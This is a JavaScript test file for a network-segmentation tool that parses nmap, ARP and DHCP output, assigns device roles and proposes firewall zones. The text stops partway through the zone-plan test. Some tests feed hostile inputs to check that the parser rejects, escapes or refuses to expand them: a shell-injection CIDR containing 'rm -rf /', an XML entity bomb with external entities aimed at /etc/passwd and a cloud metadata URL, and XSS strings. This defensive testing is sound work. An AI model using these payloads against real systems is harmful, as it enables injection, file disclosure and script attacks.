// Pure rules first, then end to end against the memory identity store and
// the fake model:
//   ZONED_MEMORY=1 ZONED_FAKE_AI=1 node test/run.js   (or `npm test`)
//
// The HTTP half drives the real Express app mounted under /zoned, the way
// the lab mounts it, so the auth cookie, the budget gate and the metered
// route's parser order are exercised as deployed. Model calls are counted
// from the identity's usage rows - the same rows that bill a real account -
// and what reached "the model" is read from the fake client's own log.
//
// Every scan, ARP table and lease file here is SYNTHETIC, written by hand
// in the tools' real shapes. MACs are from RFC 7042's documentation range
// (00:00:5e:00:53:xx) or locally administered; nothing here maps a MAC
// prefix to a maker.

const assert = require('assert');
const fs = require('fs');
const http = require('http');
const path = require('path');
const { spawnSync } = require('child_process');
const express = require('express');

if (process.env.ZONED_MEMORY !== '1' || process.env.ZONED_FAKE_AI !== '1') {
  console.error('run with ZONED_MEMORY=1 ZONED_FAKE_AI=1');
  process.exit(1);
}

const { app, identityStore, fakeCalls } = require('../server');
const C = require('../public/zoned-core');
const D = require('../public/demo');
const ai = require('../lib/ai');

const ROOT = path.join(__dirname, '..');
const tests = [];
const test = (name, fn) => tests.push({ name, fn });

/* ---------------- helpers ---------------- */

const M = (n) => '00:00:5E:00:53:' + ('0' + n.toString(16).toUpperCase()).slice(-2);
const xe = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;');
/** One nmap XML host: {ip, mac, vendor, name, ports: [[port, proto, service, product, title]], os, type, state} */
function host(h) {
  const o = [`<host><status state="${h.state || 'up'}" reason="arp-response"/>`];
  if (h.ip) o.push(`<address addr="${h.ip}" addrtype="ipv4"/>`);
  if (h.ip6) o.push(`<address addr="${h.ip6}" addrtype="ipv6"/>`);
  if (h.mac) o.push(`<address addr="${h.mac}" addrtype="mac"${h.vendor !== undefined ? ` vendor="${xe(h.vendor)}"` : ''}/>`);
  o.push(`<hostnames>${h.name ? `<hostname name="${xe(h.name)}" type="PTR"/>` : ''}${h.rawName || ''}</hostnames>`);
  o.push('<ports>');
  (h.ports || []).forEach(([port, proto, service, product, title]) => {
    o.push(`<port protocol="${proto || 'tcp'}" portid="${port}"><state state="open" reason="syn-ack"/><service name="${xe(service || '')}"${product ? ` product="${xe(product)}"` : ''}${h.type ? ` devicetype="${xe(h.type)}"` : ''}/>${title ? `<script id="http-title" output="${xe(title)}"/>` : ''}</port>`);
  });
  o.push('</ports>');
  if (h.os) o.push(`<os><osmatch name="${xe(h.os)}" accuracy="95"><osclass type="general purpose" vendor="x" osfamily="x" accuracy="95"/></osmatch><osmatch name="Worse guess" accuracy="80"/></os>`);
  o.push('</host>');
  return o.join('');
}
const nmapDoc = (hosts, args = 'nmap -sV -oX s.xml 192.168.1.0/24', head = '') => `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE nmaprun>\n${head}<nmaprun scanner="nmap" args="${xe(args)}" version="7.95">\n${hosts.map(host).join('\n')}\n<runstats><finished/><hosts up="1" down="0" total="1"/></runstats></nmaprun>\n`;
const xml = (hosts, args) => C.readInput(nmapDoc(hosts, args), 'scan.xml');
const analyse = (hosts, args, extra = [], overrides) => C.analyse([xml(hosts, args), ...extra], { overrides });
const dev = (a, ip) => a.devices.find((d) => d.ip === ip);
const roleOf = (h) => { const a = analyse([{ ip: '10.0.0.5', mac: M(5), ...h }]); return a.devices[0].cls; };
const ids = (a) => a.findings.map((f) => f.id);
const demo = () => C.analyse(D.files().map((f) => C.readInput(f.text, f.name)));

/* ---------------- addresses ---------------- */

test('MAC addresses in every common spelling; the multicast and private-address bits; CIDRs', () => {
  for (const v of ['00:1A:2B:3C:4D:5E', '00-1a-2b-3c-4d-5e', '001a.2b3c.4d5e', '001a2b3c4d5e', '0:1a:2b:3c:4d:5e', ' 00:1a:2b:3c:4d:5e ']) assert.strictEqual(C.normMac(v), '00:1a:2b:3c:4d:5e', v);
  assert.strictEqual(C.normMac('0:1a:2b:3:4d:5e'), '00:1a:2b:03:4d:5e', 'macOS drops leading zeros');
  assert.strictEqual(C.normMac('01-00-1a-2b-3c-4d-5e'), '00:1a:2b:3c:4d:5e', 'a Windows DHCP client id is 01 + the MAC');
  for (const bad of ['', 'zz:1a:2b:3c:4d:5e', '00:1a:2b:3c:4d', '192.168.1.1', '00:1a:2b:3c:4d:5e:6f']) assert.strictEqual(C.normMac(bad), '', bad);
  assert.ok(C.multicastMac('01:00:5e:00:00:16') && C.multicastMac('ff:ff:ff:ff:ff:ff') && !C.multicastMac('00:00:5e:00:53:01'));
  assert.ok(C.randomMac('da:a1:19:47:3e:02') && C.randomMac('a6:3c:91:0e:5b:21') && C.randomMac('02:00:00:00:00:01'));
  assert.ok(!C.randomMac('00:00:5e:00:53:01') && !C.randomMac('ff:ff:ff:ff:ff:ff'), 'a broadcast is not a private address');
  assert.strictEqual(C.parseCidr('192.168.1.77/24').cidr, '192.168.1.0/24');
  assert.strictEqual(C.parseCidr('10.1.2.3/16').cidr, '10.1.0.0/16');
  for (const bad of ['192.168.1.0', '192.168.1.0/33', '300.1.1.1/24', '192.168.1.0/24; rm -rf /']) assert.strictEqual(C.parseCidr(bad), null, bad);
});

/* ---------------- reading nmap XML ---------------- */

test('nmap XML: hosts down are counted and skipped, a host with no MAC kept, several addresses, the best OS guess, titles, the scanned range', () => {
  const r = xml([
    { ip: '192.168.1.1', mac: M(1), vendor: 'Ubiquiti Networks', name: 'gw.lan', ports: [[53, 'tcp', 'domain', 'dnsmasq'], [80, 'tcp', 'http', 'lighttpd', 'UniFi Login']], os: 'Linux 4.15', type: 'router' },
    { ip: '192.168.1.2', state: 'down' },
    { ip: '192.168.1.3', ports: [[22, 'tcp', 'ssh', 'OpenSSH']] },
    { ip: '192.168.1.4', ip6: 'fe80::1', mac: M(4), vendor: 'Danfoss', ports: [[47808, 'udp', 'bacnet', 'BACnet']] },
  ], 'nmap -sV -O -oX s.xml 192.168.1.0/24 10.0.0.0/8');
  assert.strictEqual(r.kind, 'nmap-xml');
  assert.strictEqual(r.down, 1);
  assert.deepStrictEqual(r.devices.map((d) => d.ip), ['192.168.1.1', '192.168.1.3', '192.168.1.4']);
  const [gw, nomac, multi] = r.devices;
  assert.deepStrictEqual([gw.mac, gw.vendor, gw.hostnames[0], gw.os.name, gw.devicetype], ['00:00:5e:00:53:01', 'Ubiquiti Networks', 'gw.lan', 'Linux 4.15', 'router']);
  assert.strictEqual(gw.ports.find((p) => p.port === 80).title, 'UniFi Login');
  assert.deepStrictEqual([nomac.mac, nomac.ports.length], ['', 1]);
  assert.deepStrictEqual([multi.ipv6, multi.ports[0].proto, multi.ports[0].port], [['fe80::1'], 'udp', 47808]);
  assert.deepStrictEqual(r.cidrs, ['192.168.1.0/24', '10.0.0.0/8']);
  assert.deepStrictEqual(r.notes, []);
});

test('nmap XML: a file cut off mid-host keeps what it has and says so; malformed tags are skipped; non-nmap XML is named', () => {
  const full = nmapDoc([{ ip: '192.168.1.1', mac: M(1), vendor: 'Cisco Systems' }, { ip: '192.168.1.2', mac: M(2), vendor: 'Danfoss', ports: [[80, 'tcp', 'http']] }]);
  const cut = full.slice(0, full.indexOf('</ports>', full.indexOf('192.168.1.2')) - 4);
  const r = C.readInput(cut, 'cut.xml');
  assert.deepStrictEqual(r.devices.map((d) => d.ip), ['192.168.1.1', '192.168.1.2']);
  assert.ok(r.notes.some((n) => /cut off|still have been running/.test(n)), r.notes.join(' | '));
  const bad = C.readInput(full.replace('<hostnames>', '<hostnames><<broken </nope>'), 'bad.xml');
  assert.strictEqual(bad.devices.length, 2);
  assert.ok(bad.notes.some((n) => /could not be read/.test(n)));
  assert.match(C.readInput('<?xml version="1.0"?><svg><g/></svg>', 'x.svg').notes[0], /not from nmap/);
  assert.match(C.readInput('', 'empty.txt').notes[0], /could not tell/);
});

test('nmap XML is read by a tokenizer that cannot expand or fetch: entity bombs, external entities and markup stay plain text', () => {
  const bomb = '<!DOCTYPE nmaprun [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY net SYSTEM "http://169.254.169.254/latest/meta-data/">]>';
  const doc = `<?xml version="1.0"?>${bomb}<nmaprun args="nmap 192.168.1.0/24"><host><status state="up"/><address addr="192.168.1.9" addrtype="ipv4"/><address addr="${M(9)}" addrtype="mac" vendor="&c;&xxe;"/><hostnames><hostname name="&net;&#x202E;evil&lt;img src=x onerror=alert(1)&gt;" type="PTR"/></hostnames><ports><port protocol="tcp" portid="80"><state state="open"/><service name="http" product="a &gt; b"/><script id="http-title" output="&lt;script&gt;alert(1)&lt;/script&gt;"/></port></ports></host></nmaprun>`;
  const r = C.readInput(doc, 'evil.xml');
  assert.strictEqual(r.kind, 'nmap-xml');
  const d = r.devices[0];
  assert.strictEqual(d.vendor, '&c;&xxe;', 'custom entities are left as their literal text');
  assert.ok(!/root:|aaaaaaaaaa/.test(JSON.stringify(r)), 'nothing was expanded or read');
  assert.ok(d.hostnames[0].startsWith('&net;') && !/\u202E/.test(d.hostnames[0]), 'bidi removed, entity not fetched');
  assert.strictEqual(d.ports[0].title, '<script>alert(1)</script>', 'markup is kept as text - and only ever drawn escaped');
  assert.ok(!/<script/i.test(C.esc(d.ports[0].title)) && !/<img/i.test(C.esc(d.hostnames[0])));
  assert.ok(r.notes.some((n) => /never expands or fetches/.test(n)));
  // The core has no way to reach anything: no require, no network, no DOM parser, no storage.
  const src = fs.readFileSync(path.join(ROOT, 'public', 'zoned-core.js'), 'utf8');
  assert.ok(!/\brequire\(|\bfetch\(|XMLHttpRequest|DOMParser|WebSocket|localStorage|sessionStorage|indexedDB|importScripts/.test(src), 'the core touches no network, parser or storage');
  // A quote holding '>' inside an attribute, and a deep or huge document, do not throw.
  assert.strictEqual(C.readInput(nmapDoc([{ ip: '192.168.1.5', mac: M(5), vendor: 'A > B "c"' }]), 'q.xml').devices[0].vendor, 'A > B "c"');
  const deep = '<nmaprun>' + '<a>'.repeat(5000) + '</nmaprun>';
  assert.doesNotThrow(() => C.readInput(deep, 'deep.xml'));
});

test('nmap normal output (-oN or the terminal) and grepable (-oG), with hosts down and versions holding slashes', () => {
  const normal = [
    '# Nmap 7.95 scan initiated as: nmap -sV 192.168.1.0/24',
    'Nmap scan report for xweb.lan (192.168.1.62)',
    'Host is up (0.0012s latency).',
    'Not shown: 998 closed tcp ports (reset)',
    'PORT   STATE SERVICE VERSION',
    '23/tcp open  telnet  BusyBox telnetd',
    '80/tcp open  http    lighttpd',
    '|_http-title: XWEB300D - Dixell',
    'MAC Address: 00:00:5E:00:53:3E (Dixell)',
    'Device type: specialized',
    '',
    'Nmap scan report for 192.168.1.70',
    'Host is up.',
    '47808/udp open  bacnet BACnet',
    'MAC Address: 00:00:5E:00:53:46 (Johnson Controls)',
    'Nmap done: 256 IP addresses (2 hosts up) scanned',
  ].join('\n');
  const n = C.readInput(normal, 'out.txt');
  assert.strictEqual(n.kind, 'nmap-normal');
  assert.deepStrictEqual(n.devices.map((d) => [d.ip, d.mac, d.vendor, d.hostnames[0] || '']), [['192.168.1.62', '00:00:5e:00:53:3e', 'Dixell', 'xweb.lan'], ['192.168.1.70', '00:00:5e:00:53:46', 'Johnson Controls', '']]);
  assert.strictEqual(n.devices[0].ports.find((p) => p.port === 80).title, 'XWEB300D - Dixell');
  assert.deepStrictEqual(n.cidrs, ['192.168.1.0/24']);
  const grep = [
    '# Nmap 7.95 scan initiated Sat Oct 11 21:00:00 2025 as: nmap -sV -oG s.gnmap 192.168.1.0/24',
    'Host: 192.168.1.1 (gw.lan)\tStatus: Up',
    'Host: 192.168.1.1 (gw.lan)\tPorts: 22/open/tcp//ssh//OpenSSH 8.4p1 Debian 5|deb11u1 (protocol 2.0)/, 53/open/tcp//domain//dnsmasq 2.85/, 80/closed/tcp//http///\tIgnored State: closed (997)\tOS: Linux 4.15',
    'Host: 192.168.1.2 ()\tStatus: Down',
    'Host: 192.168.1.60 (AK-SM800)\tPorts: 502/open/tcp//mbap//Modbus TCP/',
    '# Nmap done at Sat Oct 11 21:05:00 2025 -- 256 IP addresses (2 hosts up) scanned',
  ].join('\n');
  const g = C.readInput(grep, 's.gnmap');
  assert.strictEqual(g.kind, 'nmap-grepable');
  assert.strictEqual(g.down, 1);
  assert.deepStrictEqual(g.devices.map((d) => d.ip), ['192.168.1.1', '192.168.1.60']);
  const gw = g.devices[0];
  assert.deepStrictEqual(gw.ports.map((p) => `${p.port}/${p.state}`), ['22/open', '53/open', '80/closed']);
  assert.strictEqual(gw.ports[0].product, 'OpenSSH 8.4p1 Debian 5/deb11u1 (protocol 2.0)');
  assert.ok(g.notes.some((x) => /no MAC/.test(x)), 'grepable says it carries no MAC');
  assert.ok(!C.openPorts(gw).some((p) => p.port === 80), 'a closed port is not an open one');
});

/* ---------------- ARP and DHCP ---------------- */

test('ARP tables: Windows, macOS, Linux arp -a, arp -n and ip neigh; broadcast, multicast and incomplete skipped', () => {
  const win = ['', 'Interface: 192.168.1.20 --- 0xb', '  Internet Address      Physical Address      Type', '  192.168.1.1           00-00-5e-00-53-01     dynamic', '  192.168.1.60          00-00-5e-00-53-3c     dynamic', '  192.168.1.255         ff-ff-ff-ff-ff-ff     static', '  224.0.0.22            01-00-5e-00-00-16     static', '  239.255.255.250       01-00-5e-7f-ff-fa     static'].join('\r\n');
  const w = C.readInput(win, 'arp.txt');
  assert.deepStrictEqual([w.kind, w.devices.map((d) => d.ip), w.devices[1].mac], ['arp', ['192.168.1.1', '192.168.1.60'], '00:00:5e:00:53:3c']);
  const mac = ['? (192.168.1.1) at 0:0:5e:0:53:1 on en0 ifscope [ethernet]', 'xweb.lan (192.168.1.62) at 0:0:5e:0:53:3e on en0 ifscope [ethernet]', '? (192.168.1.7) at (incomplete) on en0 ifscope [ethernet]', '? (192.168.1.255) at ff:ff:ff:ff:ff:ff on en0 ifscope [ethernet]'].join('\n');
  const m = C.readInput(mac, 'arp-mac.txt');
  assert.deepStrictEqual(m.devices.map((d) => [d.ip, d.mac, d.hostnames[0] || '']), [['192.168.1.1', '00:00:5e:00:53:01', ''], ['192.168.1.62', '00:00:5e:00:53:3e', 'xweb.lan']]);
  const lin = ['gw.lan (192.168.1.1) at 00:00:5e:00:53:01 [ether] on eth0', '? (192.168.1.9) at <incomplete> on eth0'].join('\n');
  assert.deepStrictEqual(C.readInput(lin, 'a').devices.map((d) => d.ip), ['192.168.1.1']);
  const neigh = ['192.168.1.1 dev eth0 lladdr 00:00:5e:00:53:01 REACHABLE', '192.168.1.9 dev eth0  FAILED', 'fe80::1 dev eth0 lladdr 00:00:5e:00:53:01 router STALE', '192.168.1.70 dev eth0 lladdr 00:00:5e:00:53:46 STALE'].join('\n');
  const ne = C.readInput(neigh, 'n');
  assert.deepStrictEqual([ne.kind, ne.devices.map((d) => d.ip)], ['arp', ['192.168.1.1', '192.168.1.70']]);
  const an = ['Address                  HWtype  HWaddress           Flags Mask            Iface', '192.168.1.1              ether   00:00:5e:00:53:01   C                     eth0'].join('\n');
  assert.deepStrictEqual(C.readInput(an, 'n').devices.map((d) => d.mac), ['00:00:5e:00:53:01']);
  assert.ok(w.notes.some((x) => /no vendor names/.test(x)));
});

test('DHCP lease CSVs: odd headers, Windows exports, semicolons, quotes, no header, a column mapping; dnsmasq leases', () => {
  const odd = C.readInput('"Client Name","IPv4 Address","Hardware Addr","Lease Expires"\r\n"TILL-01","192.168.1.21","00-00-5E-00-53-15","x"\r\n"iPhone","192.168.1.120","A6-3C-91-0E-5B-21","x"\r\n"*","","",""\r\n', 'leases.csv');
  assert.strictEqual(odd.kind, 'dhcp-csv');
  assert.deepStrictEqual(odd.mapping, { ip: 1, mac: 2, hostname: 0, vendor: -1 });
  assert.deepStrictEqual(odd.devices.map((d) => [d.ip, d.mac, d.hostnames[0]]), [['192.168.1.21', '00:00:5e:00:53:15', 'TILL-01'], ['192.168.1.120', 'a6:3c:91:0e:5b:21', 'iPhone']]);
  assert.ok(odd.notes.some((n) => /1 row had no usable/.test(n)));
  const winDhcp = C.readInput('"IPAddress","ClientId","HostName"\n"192.168.1.10","00-00-5e-00-53-0a","BACKOFFICE-PC.corp.local"\n', 'w.csv');
  assert.deepStrictEqual(winDhcp.devices.map((d) => [d.ip, d.mac, d.hostnames[0]]), [['192.168.1.10', '00:00:5e:00:53:0a', 'BACKOFFICE-PC.corp.local']]);
  const semi = C.readInput('Name;IP address;MAC address;Manufacturer\n"Lutron, main panel";192.168.1.80;00:00:5e:00:53:50;Lutron Electronics\n', 's.csv');
  assert.deepStrictEqual(semi.devices.map((d) => [d.hostnames[0], d.vendor]), [['Lutron, main panel', 'Lutron Electronics']]);
  const uniqueId = C.readInput('Client IP Address,Name,Lease Expiration,Type,Unique ID,Description\n192.168.1.60,AK-SM800,x,DHCP,00005e00533c,\n', 'u.csv');
  assert.strictEqual(uniqueId.devices[0].mac, '00:00:5e:00:53:3c', 'Windows Unique ID without separators');
  const headerless = C.readInput('192.168.1.5,00:00:5e:00:53:05,cam-1\n192.168.1.6,00:00:5e:00:53:06,cam-2\n', 'h.csv');
  assert.deepStrictEqual([headerless.devices.length, headerless.columns[0]], [2, 'Column 1']);
  const nothing = C.readInput('Foo,Bar\nx,y\n', 'f.csv');
  assert.ok(nothing.devices.length === 0 && nothing.notes.some((n) => /Pick the columns/.test(n)));
  const mapped = C.readInput('Foo,Bar\n192.168.1.9,ab\n', 'f.csv', { kind: 'dhcp-csv', mapping: { ip: 0, mac: -1, hostname: 1, vendor: -1 } });
  assert.deepStrictEqual(mapped.devices.map((d) => [d.ip, d.hostnames[0]]), [['192.168.1.9', 'ab']], 'the page\u2019s column picker wins');
  const dm = C.readInput('1760000000 00:00:5e:00:53:15 192.168.1.21 till-01 01:00:00:5e:00:53:15\n1760000000 a6:3c:91:0e:5b:21 192.168.1.120 * *\n', 'dnsmasq.leases');
  assert.deepStrictEqual([dm.kind, dm.devices.map((d) => d.hostnames[0] || '-')], ['dhcp-dnsmasq', ['till-01', '-']]);
});

test('merging: one device per MAC across files, an IP-only entry joins its MAC, one IP with two MACs keeps both with a note', () => {
  const scan = xml([{ ip: '192.168.1.60', mac: M(60), vendor: 'Danfoss', ports: [[80, 'tcp', 'http']] }]);
  const udp = xml([{ ip: '192.168.1.60', mac: M(60), vendor: 'Danfoss', ports: [[47808, 'udp', 'bacnet']] }]);
  const grep = C.readInput('Host: 192.168.1.60 (AK-SM800)\tPorts: 502/open/tcp//mbap///', 'g');
  const arp = C.readInput('  192.168.1.60          00-00-5e-00-53-3c     dynamic\n  192.168.1.61          00-00-5e-00-53-3d     dynamic', 'arp.txt');
  const lease = C.readInput('IP,MAC,Name\n192.168.1.61,00:00:5e:00:53:99,old-lease\n', 'l.csv');
  const m = C.merge([scan, udp, grep, arp, lease]);
  const ak = m.devices.find((d) => d.mac === '00:00:5e:00:53:3c');
  assert.deepStrictEqual(ak.ports.map((p) => p.port + '/' + p.proto).sort(), ['47808/udp', '502/tcp', '80/tcp']);
  assert.deepStrictEqual(ak.sources.sort(), ['arp', 'nmap-grepable', 'nmap-xml']);
  assert.ok(ak.hostnames.includes('AK-SM800'));
  const at61 = m.devices.filter((d) => d.ip === '192.168.1.61');
  assert.strictEqual(at61.length, 2, 'two MACs claiming one IP stay two devices');
  assert.ok(at61.every((d) => d.conflict && d.conflict.length === 1) && m.notes.some((n) => /2 different MAC/.test(n)));
  assert.strictEqual(new Set(m.devices.map((d) => d.id)).size, m.devices.length, 'ids are unique');
});

/* ---------------- roles ---------------- */

test('every role, from its own evidence', () => {
  const cases = [
    ['pos', { vendor: 'Verifone', name: 'pinpad-02' }],
    ['pos', { vendor: 'PAX Technology' }],
    ['office', { vendor: 'Dell', ports: [[445, 'tcp', 'microsoft-ds'], [3389, 'tcp', 'ms-wbt-server']], os: 'Microsoft Windows 11' }],
    ['printer', { vendor: 'Brother Industries', ports: [[9100, 'tcp', 'jetdirect']] }],
    ['camera', { vendor: 'Hikvision Digital Technology', ports: [[554, 'tcp', 'rtsp']] }],
    ['camera', { ports: [[554, 'tcp', 'rtsp'], [37777, 'tcp', 'unknown']] }],
    ['network', { vendor: 'Cisco Systems', name: 'switch-core' }],
    ['guest', { mac: 'da:a1:19:47:3e:02', name: 'Galaxy-S23' }],
    ['refrigeration', { vendor: 'Danfoss', ports: [[502, 'tcp', 'mbap']] }],
    ['refrigeration', { vendor: 'Emerson Climate Technologies', name: 'E2-rack-A' }],
    ['hvac', { ports: [[47808, 'udp', 'bacnet']] }],
    ['hvac', { vendor: 'Tridium', ports: [[1911, 'tcp', 'fox']] }],
    ['bms', { vendor: 'Lenovo', name: 'BAS-PC', ports: [[445, 'tcp', 'microsoft-ds'], [4911, 'tcp', 'niagara-fox']] }],
    ['lighting', { vendor: 'Lutron Electronics' }],
    ['lighting', { ports: [[3671, 'udp', 'knx']] }],
    ['remote', { vendor: 'Cradlepoint', ports: [[443, 'tcp', 'https']] }],
    ['remote', { vendor: 'Teltonika', name: 'RUT950' }],
    ['iot', { vendor: 'ecobee' }],
    ['iot', { vendor: 'Espressif', ports: [[1883, 'tcp', 'mqtt']] }],
    ['unknown', { vendor: 'Shenzhen Bilian Electronic', ports: [[80, 'tcp', 'http']] }],
    ['unknown', {}],
  ];
  for (const [want, h] of cases) {
    const cls = roleOf(h);
    assert.strictEqual(cls.role, want, `${JSON.stringify(h)} -> ${cls.role} ${JSON.stringify(cls.score)}`);
    if (want !== 'unknown') assert.ok(cls.evidence.some((e) => e.role === want && e.text), 'with evidence in words');
  }
  assert.strictEqual(roleOf({ vendor: 'Danfoss', name: 'AK-SM800', ports: [[80, 'tcp', 'http', '', 'Danfoss AK-SM 800']] }).conf, 'high');
});

test('what must not count: words inside other words, vendor-only names in banners, remote control on a PC, Honeywell Home', () => {
  assert.ok(!('pos' in roleOf({ name: 'paxos-server', vendor: 'Paxos Inc' }).score), 'PAX is a word, not a prefix');
  assert.ok(!('remote' in roleOf({ name: 'digital-signage', vendor: 'Digital Ally' }).score), 'Digi is not digital');
  assert.strictEqual(roleOf({ name: 'position-tracker' }).role, 'unknown', 'pos is not position');
  assert.strictEqual(roleOf({ ports: [[80, 'tcp', 'http', 'nginx', 'Carrier status page']] }).role, 'unknown', '"Carrier" in a banner is not the HVAC maker');
  assert.strictEqual(roleOf({ ports: [[80, 'tcp', 'http', '', 'Axis of evil']] }).role, 'unknown');
  assert.strictEqual(roleOf({ vendor: 'Honeywell Home' }).role, 'iot', 'a smart thermostat, not a building controller');
  assert.strictEqual(roleOf({ vendor: 'Dell', ports: [[3389, 'tcp', 'ms-wbt-server'], [5900, 'tcp', 'vnc']] }).role, 'office', 'RDP on a PC is not a remote-access gateway');
  assert.notStrictEqual(roleOf({ ports: [[80, 'tcp', 'http', 'Microsoft IIS httpd']] }).role, 'office', 'Microsoft in a banner is not a PC maker');
  assert.strictEqual(roleOf({ vendor: 'Private', ports: [[10001, 'tcp', 'scp-config']] }).role, 'unknown');
});

test('conflicting evidence is shown, not hidden; an override wins and says so', () => {
  const a = demo();
  const bms = dev(a, D.planted.conflict);
  assert.deepStrictEqual([bms.cls.role, bms.cls.conf, bms.cls.alt], ['bms', 'medium', 'office']);
  const groups = C.evidenceByRole(bms.cls);
  assert.deepStrictEqual(groups.slice(0, 2).map((g) => g.role), ['bms', 'office']);
  const over = C.analyse(D.files().map((f) => C.readInput(f.text, f.name)), { overrides: { [bms.id]: 'office', 'm:00:00:5e:00:53:96': 'pos', bogus: 'pos', [dev(a, '192.168.1.60').id]: 'not-a-role' } });
  const b2 = dev(over, D.planted.conflict);
  assert.deepStrictEqual([b2.cls.role, b2.cls.conf, b2.cls.overridden, b2.cls.auto.role, b2.zone], ['office', 'you', true, 'bms', 'office']);
  assert.strictEqual(dev(over, '192.168.1.150').cls.role, 'pos');
  assert.strictEqual(dev(over, '192.168.1.60').cls.role, 'refrigeration', 'an unknown role in an override is ignored');
  assert.strictEqual(over.stats.byRole.unknown, 2);
  assert.ok(!over.findings.find((f) => f.id === 'unknowns').title.startsWith('3'), 'findings follow the override');
});

/* ---------------- the example ---------------- */

test('the example exhibits exactly its planted findings, headline and roles', () => {
  const a = demo();
  assert.strictEqual(a.devices.length, D.planted.devices);
  assert.deepStrictEqual(ids(a), D.planted.findings, 'exactly these findings, in this order');
  for (const [r, n] of Object.entries(D.planted.roles)) assert.strictEqual(a.stats.byRole[r], n, `${r}: ${a.stats.byRole[r]}`);
  assert.strictEqual(a.findings[0].title, D.planted.headline);
  assert.ok(a.verdict.headline.startsWith(D.planted.headline) && /anyone who gets into one can reach the others/.test(a.verdict.headline));
  assert.strictEqual(a.verdict.sub, '45 devices on one flat network, 192.168.1.0/24');
  const by = Object.fromEntries(a.findings.map((f) => [f.id, f]));
  assert.deepStrictEqual(by.cleartext.devices.map((id) => a.byId[id].ip).sort(), D.planted.telnet);
  assert.deepStrictEqual(by['remote-gateway'].devices.map((id) => a.byId[id].ip), ['192.168.1.90']);
  assert.match(by['open-ot-protocols'].detail, /BACnet\/IP on 2 devices/);
  assert.match(by['open-ot-protocols'].detail, /Modbus TCP on 1 device/);
  assert.deepStrictEqual(by['default-names'].devices.map((id) => a.byId[id].name).sort(), ['AK-SM800', 'DS-7608NI-K2', 'XWEB300D', 'airlink-lx40']);
  assert.strictEqual(by['http-admin'].devices.length, 7);
  assert.strictEqual(by['guest-on-business'].severity, 'high');
  assert.ok(by['pci-scope'].detail.includes('not legal or compliance advice') && /acquirer|QSA/.test(by['pci-scope'].detail));
  const sev = a.findings.map((f) => C.SEVERITY[f.severity].rank);
  assert.deepStrictEqual(sev, [...sev].sort((x, y) => y - x), 'worst first');
  assert.strictEqual(dev(a, '192.168.1.40').cls.role, 'guest', 'the manager\u2019s phone, a real Apple address');
  assert.ok(dev(a, '192.168.1.21').sources.includes('dhcp') && dev(a, '192.168.1.21').sources.includes('nmap-xml'), 'tills merged across the scan and the lease list');
  // Every MAC in the example is from RFC 7042's documentation range, or private.
  for (const d of a.devices) assert.ok(d.mac.startsWith('00:00:5e:00:53:') || C.randomMac(d.mac), d.mac);
});

/* ---------------- findings, one at a time ---------------- */

test('each finding from a network built to show it - and not otherwise', () => {
  const pos = { ip: '192.168.1.21', mac: M(21), vendor: 'Verifone' };
  const ctl = { ip: '192.168.1.60', mac: M(60), vendor: 'Danfoss', ports: [[443, 'tcp', 'https']] };
  const office = { ip: '192.168.1.10', mac: M(10), vendor: 'Dell', ports: [[445, 'tcp', 'microsoft-ds']] };
  assert.deepStrictEqual(ids(analyse([pos, ctl])), ['ot-with-pos', 'pci-scope']);
  assert.match(analyse([pos, ctl]).findings[0].title, /^1 refrigeration controller shares a network with your 1 till$/);
  assert.deepStrictEqual(ids(analyse([office, ctl])), ['ot-with-office', 'no-pos']);
  // Already apart: different subnets.
  const apart = analyse([pos, { ...ctl, ip: '192.168.30.60' }], 'nmap 192.168.1.0/24 192.168.30.0/24');
  assert.deepStrictEqual(ids(apart), ['separate']);
  assert.strictEqual(apart.verdict.tone, 'ok');
  assert.ok(ids(analyse([pos, { ip: '192.168.1.90', mac: M(90), vendor: 'Cradlepoint' }])).includes('remote-gateway'));
  assert.ok(ids(analyse([office, { ip: '192.168.1.5', mac: M(5), vendor: 'Cisco Systems', ports: [[21, 'tcp', 'ftp']] }])).includes('cleartext'));
  assert.ok(!ids(analyse([office])).includes('cleartext'));
  const vnc = analyse([office, { ip: '192.168.1.62', mac: M(62), vendor: 'Dixell', ports: [[5900, 'tcp', 'vnc']] }]);
  assert.ok(ids(vnc).includes('remote-desktop'));
  assert.match(vnc.findings.find((f) => f.id === 'remote-desktop').title, /VNC/);
  // HTTP admin: only when there is no HTTPS beside it.
  const camHttp = { ip: '192.168.1.100', mac: M(100), vendor: 'Dahua', ports: [[80, 'tcp', 'http'], [554, 'tcp', 'rtsp']] };
  assert.ok(ids(analyse([pos, camHttp])).includes('http-admin') && ids(analyse([pos, camHttp])).includes('cameras-on-pos'));
  assert.ok(!ids(analyse([pos, { ...camHttp, ports: [[80, 'tcp', 'http'], [443, 'tcp', 'https'], [554, 'tcp', 'rtsp']] }])).includes('http-admin'));
  // Guests.
  assert.ok(ids(analyse([office, { ip: '192.168.1.120', mac: 'a6:3c:91:0e:5b:21', name: 'iPhone' }])).includes('guest-on-business'));
  assert.ok(!ids(analyse([{ ip: '192.168.1.120', mac: 'a6:3c:91:0e:5b:21', name: 'iPhone' }])).includes('guest-on-business'), 'a phone alone is not a finding');
  // Building protocols open to everything.
  const bac = analyse([office, { ip: '192.168.1.70', mac: M(70), ports: [[47808, 'udp', 'bacnet']] }]);
  assert.ok(ids(bac).includes('open-ot-protocols'));
  // Default names, unknowns.
  assert.ok(ids(analyse([office, { ip: '192.168.1.80', mac: M(80), name: 'JACE-8000' }])).includes('default-names'));
  assert.ok(ids(analyse([office, { ip: '192.168.1.99', mac: M(99) }])).includes('unknowns'));
  assert.deepStrictEqual(ids(C.analyse([])), []);
  assert.strictEqual(C.analyse([]).verdict.tone, 'empty');
});

/* ---------------- the plan ---------------- */

test('the zone plan places every device once; rules are default deny and nothing goes from Building & OT to Payments', () => {
  const a = demo();
  const placed = a.plan.zones.flatMap((z) => z.devices);
  assert.strictEqual(placed.length, a.devices.length);
  assert.strictEqual(new Set(placed).size, a.devices.length, 'each device in exactly one zone');
  assert.deepStrictEqual(a.plan.zones.map((z) => z.name), ['Payments', 'Office', 'Building & OT', 'Cameras', 'Guest', 'Management']);
  assert.deepStrictEqual(a.plan.zones.map((z) => z.subnet), ['10.10.20.0/24', '10.10.10.0/24', '10.10.30.0/24', '10.10.40.0/24', '10.10.50.0/24', '10.10.99.0/24']);
